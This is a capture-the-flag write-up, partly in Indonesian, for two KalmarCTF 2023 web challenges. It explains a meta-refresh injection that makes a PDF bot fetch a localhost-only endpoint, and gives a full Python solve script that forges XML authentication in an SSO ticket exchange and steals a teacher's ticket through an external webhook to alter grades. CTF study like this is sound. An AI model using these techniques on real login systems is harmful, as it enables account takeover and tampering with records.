# Invoice - web
Pada challenge ini terdapat bot yang akan merubah page menjadi pdf. Dan dalam website juga terdapat endpoint `/orders` tetapi kita tidak bisa mengakses `/orders` dari luar, kita hanya bisa mengakses dari localhost.

```node 
app.get('/orders', (req, res) => {
  if (req.socket.remoteAddress != "::ffff:127.0.0.1") {
    return res.send("Nice try")
  }
  if (req.cookies['bot']) {
    return res.send("Nice try")
  }
  res.setHeader('X-Frame-Options', 'none');
  res.send(process.env.FLAG || 'kalmar{test_flag}')
})
```

Di endpoint render voice juga terdapat CSP sebagai berikut:
```
  res.setHeader("Content-Security-Policy", "default-src 'unsafe-inline' maxcdn.bootstrapcdn.com; object-src 'none'; script-src 'none'; img-src 'self' dummyimage.com;")
```
Sehingga kita tidak dapat melakukan XSS. 

Jika kita perhatikan di bagian `templates/invoice.html` kita akan mendpatkan seperti ini

```
    <title>Invoice for {{ name }}</title>
```

Dimana kita bisa mengendalikan `{{ name }}` dari input yang kita masukkan di endpoint dibawah ini. Sehingga kita bisa merubah `meta` tagnya, dan me-redirect ke url yang kita mau misal `<meta http-equiv="refresh" content="0; url=http://127.0.0.1:5000/orders">`.


```node 
app.get('/renderInvoice', async (req, res) => {
  if (!invoice) {
    invoice = await readFile('templates/invoice.html', 'utf8')
  }

  let html = invoice
  .replaceAll("{{ name }}", req.query.name)
  .replaceAll("{{ address }}", req.query.address)
  .replaceAll("{{ phone }}", req.query.phone)
  .replaceAll("{{ email }}", req.query.email)
  .replaceAll("{{ discount }}", req.query.discount)
  res.setHeader("Content-Type", "text/html")
  res.setHeader("Content-Security-Policy", "default-src 'unsafe-inline' maxcdn.bootstrapcdn.com; object-src 'none'; script-src 'none'; img-src 'self' dummyimage.com;")
  res.send(html)
})
```

Kita masukkan `<meta http-equiv="refresh" content="0; url=http://127.0.0.1:5000/orders">` ke parameter `name` di endpoint `/cart` dan kita akan mendapatkan flagnya.

# 2cool4school - web
Solve script:
```python
from base64 import b64decode
import json
import requests
from sys import argv
from urllib.parse import quote_plus
from pwn import log, context

context.log_level = "INFO"
SSO_URL = "http://sso.chal-kalmarc.tf"
GRADE_URL = "http://grade.chal-kalmarc.tf"


def get_username_password(url=SSO_URL):
    res = requests.post(url+"/register")
    return res.json()


def get_ticket(creds, url=SSO_URL):
    res = requests.post(url+"/login?service=http://grade.chal-kalmarc.tf/login", data={
        "username": creds['username'],
        "password": creds['password'],
    }, allow_redirects=False)
    return res.text.replace("Found. Redirecting to http://grade.chal-kalmarc.tf/login?ticket=", "")


class Grade_Endpoint:
    def __init__(self, ticket, forge=True, xml=None, id=None) -> None:
        self.ticket = ticket
        self.url = GRADE_URL
        if forge:
            self.cookie = self.forge(id=id, xml=xml)
        else:
            self.cookie = self.no_forge()

    def forge(self, id, xml=None):
        if not xml:
            xml = f"""
            </authenticationFailure>
                <authenticationSuccess>
                    <id>{id if id else "foo"}</id>
                    <username>foo</username>
                </authenticationSuccess>
            <authenticationFailure>
            """
        res = requests.get(
            self.url+"/login?ticket="+self.ticket +
            "%26service%3D" + quote_plus(xml)+"%23",
            allow_redirects=False
        )
        return res.cookies

    def no_forge(self, url=GRADE_URL):
        res = requests.get(
            url+"/login?ticket="+self.ticket,
            allow_redirects=False
        )
        return res.cookies

    def isNew(self):
        res = requests.get(self.url+"/api/profile/isNew", cookies=self.cookie)
        return res.text

    def getGrades(self, id=None):
        res = requests.get(self.url+"/api/grades" +
                           ("/"+id if id else ""), cookies=self.cookie)
        return res.text

    def updateGraddes(self, id, name, grade, coment):
        res = requests.put(self.url+"/api/grades/"+id, cookies=self.cookie, json={
            "name": name, "values": {
                "notes": coment,
                "`grade`": grade
            },
        })
        return res.text

    def request_reevaluation(self):
        res = requests.post(self.url+"/whine", cookies=self.cookie)
        return res.text

    def logout(self):
        res = requests.post(self.url+"/logout", cookies=self.cookie)
        return res.headers

    def check_role(self):
        res = requests.get(self.url+"/api/profile/role", cookies=self.cookie)
        return res.text

    # js/api/Profile.js

    def getStudentProfile(self, id=None):
        res = requests.get(self.url+"/api/profile" +
                           ("/"+id if id else ""), cookies=self.cookie)
        return res.text

    def newProfile(self, name, picture):
        res = requests.post(self.url+"/api/profile/new", cookies=self.cookie, json={
            "name": name,
            "picture": picture,
        })
        return res.text

    def updateName(self, name):
        res = requests.put(self.url+"/api/profile", cookies=self.cookie, json={
            "name": name,
        })
        return res.text

    def updatePicture(self, picture):
        res = requests.put(self.url+"/api/profile", cookies=self.cookie, json={
            "picture": picture,
        })
        return res.text

    def update(self, obj):
        res = requests.put(self.url+"/api/profile",
                           cookies=self.cookie, json=obj)
        return res.text

    def flag(self):
        res = requests.get(self.url+"/flag", cookies=self.cookie)
        return res.text


if __name__ == "__main__":
    if argv[1] == "1":
        webhook = argv[2]  # https://weebhook.site
        user = get_username_password()
        log.info("username & password: %s", user)
        ticket = get_ticket(user)
        log.info("ticket: %s", ticket)
        grade_endpoint = Grade_Endpoint(ticket)
        log.info("cookie: %s", b64decode(
            grade_endpoint.cookie.get("grade-session")))
        if grade_endpoint.isNew() == "true":
            grade_endpoint.newProfile("foo", SSO_URL+"/login?service="+webhook)
        else:
            grade_endpoint.updatePicture(SSO_URL+"/login?service="+webhook)
        log.info("requesting re-evaluation...")
        grade_endpoint.request_reevaluation()
        log.info("check your webhook")
    elif argv[1] == "2":
        webhook = argv[2]
        ticket = argv[3]
        grade_endpoint = Grade_Endpoint(ticket, xml=webhook)
        teacher_session = grade_endpoint.cookie.get("grade-session")
        log.info("teacher session: %s", teacher_session)
        log.info("changing your cysec grade...")
        grade_endpoint.updateGraddes(
            "foo", "Fundamentals of Cyber Security", "A", "great")
        log.info("success...")
    elif argv[1] == "3":
        user = get_username_password()
        log.info("username & password: %s", user)
        ticket = get_ticket(user)
        log.info("ticket: %s", ticket)
        grade_endpoint = Grade_Endpoint(ticket)
        log.info("cookie: %s", b64decode(
            grade_endpoint.cookie.get("grade-session")))
        flag = grade_endpoint.flag()
        log.info("flag: %s", flag)     
```

# External Writeup
Daffainfo:
- https://github.com/daffainfo/ctf-writeup/tree/main/KalmarCTF%202023